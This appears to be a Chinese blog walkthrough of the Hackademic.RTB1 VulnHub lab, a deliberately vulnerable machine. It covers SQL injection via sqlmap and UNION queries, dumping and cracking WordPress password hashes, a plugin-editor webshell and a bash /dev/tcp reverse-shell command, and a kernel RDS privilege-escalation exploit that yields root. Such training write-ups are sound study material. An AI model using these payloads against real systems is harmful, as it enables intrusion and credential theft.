+++
date = '2026-11-04T17:19:45+08:00'
draft = false
title = '[VulnHub靶机]HackademicRTB1渗透记录'
tags = ['渗透','Vulnhub','SQLi','Kernel']
+++

## 信息收集

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.6

```Shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ sudo arp-scan -l                                                                               
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.6      00:0c:29:01:8a:4d       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 3 responded
```

端口扫描

```Shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ sudo nmap -sT -O --min-rate 10000 -p- 10.10.10.6 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-04 17:21 +0800
Nmap scan report for 10.10.10.6
Host is up (0.00049s latency).
Not shown: 65514 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach)
PORT   STATE  SERVICE
22/tcp closed ssh
80/tcp open   http
MAC Address: 00:0C:29:01:8A:4D (VMware)
Device type: general purpose|media device|webcam|router|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|5.X (95%), LG embedded (92%), Tandberg embedded (90%), MikroTik RouterOS 7.X (89%), Infomir embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.10 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/h:infomir:mag-250 cpe:/o:linux:linux_kernel:2.6.32
Aggressive OS guesses: Linux 2.6.22 - 2.6.36 (95%), LG Bp430 Blu-ray Player (92%), Linux 2.6.23 - 2.6.38 (91%), Linux 2.6.31 - 2.6.35 (91%), Linux 2.6.32 - 2.6.39 (91%), Linux 2.6.32 (90%), Tandberg Video Conference System (90%), Linux 2.6.34 (90%), Linux 2.6.20 (90%), Linux 2.6.32 - 3.13 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```

只有80端口开放, 深入扫描

```Shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ sudo nmap -sT -sV -sC -p22,80 10.10.10.6              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-04 17:23 +0800
Nmap scan report for 10.10.10.6
Host is up (0.00042s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-server-header: Apache/2.2.15 (Fedora)
|_http-title: Hackademic.RTB1  
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 00:0C:29:01:8A:4D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.94 seconds
```

漏洞扫描

```Shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ sudo nmap --script=vuln -p80 10.10.10.6
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-04 17:23 +0800
Nmap scan report for 10.10.10.6
Host is up (0.00037s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192:
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-trace: TRACE is enabled
| http-enum:
|_  /icons/: Potentially interesting folder w/ directory listing
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 149.27 seconds
```

扫描UDP端口, 没有开放的

```Shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ sudo nmap -sU --min-rate 10000 10.10.10.6
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-04 17:28 +0800
Nmap scan report for 10.10.10.6
Host is up (0.00039s latency).
Not shown: 994 open|filtered udp ports (no-response)
PORT      STATE    SERVICE
407/udp   filtered timbuktu
16420/udp filtered unknown
17487/udp filtered unknown
34579/udp filtered unknown
53838/udp filtered unknown
61961/udp filtered unknown
MAC Address: 00:0C:29:01:8A:4D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.97 seconds
```

## Web渗透

### SQLi

访问80端口

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261104172517553.png)

点击标题或target超链接, 会弹出目标(读取key.txt)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261104172630882.png)

点击"Got Root"超链接, 注意到URL中出现了p参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HolynixV1/20261104172957082.png)

试了一番感觉没有漏洞, 点击Uncategorized, 注意到URL中出现了`cat`参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104173411161.png)

`cat`值改为`2`, 出现NotFound页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104173501029.png)

改为`2 or 1`, 又出现了正常页面, 这意味着此处存在数字型SQL注入漏洞

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104173605178.png)

使用`order by`语句探测, 发现为`6`时报错, 这表明该查询共有5个字段, 且页面错误暴露了完整SQL语句

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104173811551.png)

#### SQLmap

使用SQLmap自动化攻击, 发现三个数据库

```Shell
sqlmap -u 'http://10.10.10.6/Hackademic_RTB1/?cat=1' -p cat --technique=B --dbms MySQL --dbs --batch
```

```text
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
```

查看wordpress库中的表

```shell
sqlmap -u 'http://10.10.10.6/Hackademic_RTB1/?cat=1' -p cat --technique=B --dbms MySQL -D wordpress --tables --batch
```

```text
Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
```

查看wp_users表的列

```shell
sqlmap -u 'http://10.10.10.6/Hackademic_RTB1/?cat=1' -p cat --technique=B --dbms MySQL -D wordpress -T wp_users --columns --batch
```

```text
Database: wordpress
Table: wp_users
[22 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(60)         |
| user_aim            | varchar(50)         |
| user_browser        | varchar(200)        |
| user_description    | longtext            |
| user_domain         | varchar(200)        |
| user_email          | varchar(100)        |
| user_firstname      | varchar(50)         |
| user_icq            | int(10) unsigned    |
| user_idmode         | varchar(20)         |
| user_ip             | varchar(15)         |
| user_lastname       | varchar(50)         |
| user_level          | int(2) unsigned     |
| user_login          | varchar(60)         |
| user_msn            | varchar(100)        |
| user_nicename       | varchar(50)         |
| user_nickname       | varchar(50)         |
| user_pass           | varchar(64)         |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
| user_yim            | varchar(50)         |
+---------------------+---------------------+
```

dump用户名和密码

```shell
sqlmap -u 'http://10.10.10.6/Hackademic_RTB1/?cat=1' -p cat --technique=B --dbms MySQL -D wordpress -T wp_users -C 'user_login,user_pass' -dump --batch
```

```text
Database: wordpress                                                                                                                                                   
Table: wp_users
[6 entries]
+--------------+---------------------------------------------+
| user_login   | user_pass                                   |
+--------------+---------------------------------------------+
| NickJames    | 21232f297a57a5a743894a0e4a801fc3 (admin)    |
| MaxBucky     | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   |
| GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   |
| JasonKonnors | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  |
| TonyBlack    | a6e514f9486b83cb53d8d932f9a04292 (napoleon) |
| JohnSmith    | b986448f0bb9e5e124ca91d3d650f52c            |
+--------------+---------------------------------------------+
```

#### 手工注入

联合注入, 没有保存, 但也没返回任何我们查询的内容

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104203014056.png)

将cat的值改为一个不存在的数字(如0), 再次访问, 发现标题存在2, 这说明联合查询的第二列被显示出来了

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104203502425.avif)

查询wp_users表内容`0 UNION SELECT 1,group_concat(user_login,0x2d,user_pass),3,4,5 from wp_users`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/%E6%89%8B%E5%8A%A8%E6%9F%A5%E8%AF%A2.avif)

### 密码破解

使用somd5查询JohnSmith的哈希, 发现是`PUPPIES`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104175747445.png)

### WordPress渗透

多种线索提示我们该网站使用Wordpress系统, 尝试访问`http://10.10.10.6/Hackademic_RTB1/wp-login.php`, 果然来到了登陆页面

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104175540127.png)

使用用户名`NickJames`, 密码`admin`成功登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104175947473.png)

直接发布一个一句话木马页面, 看看能不能行

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104180300470.png)

php代码被当成纯文本渲染, 没有执行

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104180640129.png)

登录其它账户, 发现`GeorgeMiller`的界面多出了很多选项

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104190327793.png)

在Plugins-Plugin Editor中发现可以编辑的php文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104190950862.png)

插入一句话木马并保存

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104191104953.png)

访问`http://10.10.10.6/Hackademic_RTB1/wp-content/plugins/markdown.php?cmd=whoami`, 可以实现RCE

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/HackademicRTB1/20261104191146487.png)

攻击机开启监听, 访问`http://10.10.10.6/Hackademic_RTB1/wp-content/plugins/markdown.php?cmd=%2Fbin%2Fbash+-c+%22%2Fbin%2Fbash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%22`即可获得shell

```shell
┌──(kali㉿kali)-[~/HackademicRTB1]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.10.6: inverse host lookup failed: Unknown host
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.6] 58447
bash: no job control in this shell
bash-4.0$
```

## 权限提升

查看内核版本

```shell
uname -a
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
```

在searchsploit上搜索相关漏洞

```shell
searchsploit Linux Kernel 2.6.3 Privilege Escalation
```

使用`Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation(15285)`

```shell
searchsploit -m 15285
python3 -m http.server
```

传输到靶机

```shell
wget http://10.10.10.3:8000/15285.c
```

编译并运行

```shell
bash-4.0$ gcc -o 15285 15285.c
gcc -o 15285 15285.c
bash-4.0$ ./15285
./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# whoami
whoami
root
```

读取key.txt

```shell
cat /root/key.txt
```

```text
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
```
